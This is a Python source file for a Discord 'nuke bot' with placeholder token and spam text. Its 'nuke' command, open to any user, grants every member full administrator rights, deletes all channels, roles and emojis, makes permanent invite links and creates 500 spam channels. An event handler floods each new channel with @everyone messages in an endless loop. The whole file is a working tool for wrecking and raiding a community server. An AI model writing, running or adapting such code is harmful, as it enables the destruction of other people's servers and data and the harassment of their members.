import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio

token = "YOUR_TOKEN"


SPAM_CHANNEL =  ["TEXT_OF_SPAMMED_CHANNELS"]
SPAM_MESSAGE = ["@everyone SPAMMED_TEXT"]

client = commands.Bot(command_prefix="!")


@client.event
async def on_ready():
   print(''' 
   

██╗░░░██╗██╗░░░░░████████╗██╗███╗░░░███╗░█████╗░████████╗███████╗
██║░░░██║██║░░░░░╚══██╔══╝██║████╗░████║██╔══██╗╚══██╔══╝██╔════╝
██║░░░██║██║░░░░░░░░██║░░░██║██╔████╔██║███████║░░░██║░░░█████╗░░
██║░░░██║██║░░░░░░░░██║░░░██║██║╚██╔╝██║██╔══██║░░░██║░░░██╔══╝░░
╚██████╔╝███████╗░░░██║░░░██║██║░╚═╝░██║██║░░██║░░░██║░░░███████╗
░╚═════╝░╚══════╝░░░╚═╝░░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░╚══════╝

██████╗░██╗░██████╗░█████╗░░█████╗░██████╗░██████╗░
██╔══██╗██║██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗
██║░░██║██║╚█████╗░██║░░╚═╝██║░░██║██████╔╝██║░░██║
██║░░██║██║░╚═══██╗██║░░██╗██║░░██║██╔══██╗██║░░██║
██████╔╝██║██████╔╝╚█████╔╝╚█████╔╝██║░░██║██████╔╝
╚═════╝░╚═╝╚═════╝░░╚════╝░░╚════╝░╚═╝░░╚═╝╚═════╝░

███╗░░██╗██╗░░░██╗██╗░░██╗███████╗
████╗░██║██║░░░██║██║░██╔╝██╔════╝
██╔██╗██║██║░░░██║█████═╝░█████╗░░
██║╚████║██║░░░██║██╔═██╗░██╔══╝░░
██║░╚███║╚██████╔╝██║░╚██╗███████╗
╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝

██████╗░░█████╗░████████╗
██╔══██╗██╔══██╗╚══██╔══╝
██████╦╝██║░░██║░░░██║░░░
██╔══██╗██║░░██║░░░██║░░░
██████╦╝╚█████╔╝░░░██║░░░
╚═════╝░░╚════╝░░░░╚═╝░░░

 ''')
   await client.change_presence(activity=discord.Game(name="BOTS_DESCRIPTION"))

@client.command()
@commands.is_owner()
async def stop(ctx):
    await ctx.bot.logout()
    print (Fore.GREEN + f"{client.user.name} has logged out successfully." + Fore.RESET)

@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
    except:
      print(Fore.GREEN + "I was unable to give everyone admin" + Fore.RESET)
    for channel in guild.channels:
      try:
        await channel.delete()
        print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
    for role in guild.roles:
     try:
       await role.delete()
       print(Fore.MAGENTA + f"{role.name} Has been deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{role.name} Has not been deleted" + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
       print(Fore.MAGENTA + f"{emoji.name} Was deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
    await guild.create_text_channel("TEXT_OF_SPAMMED_CHANNELS")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        print(f"New Invite: {link}")
    amount = 500
    for i in range(amount):
       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"nuked {guild.name} Successfully.")
    return

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))

client.run(token, bot=True)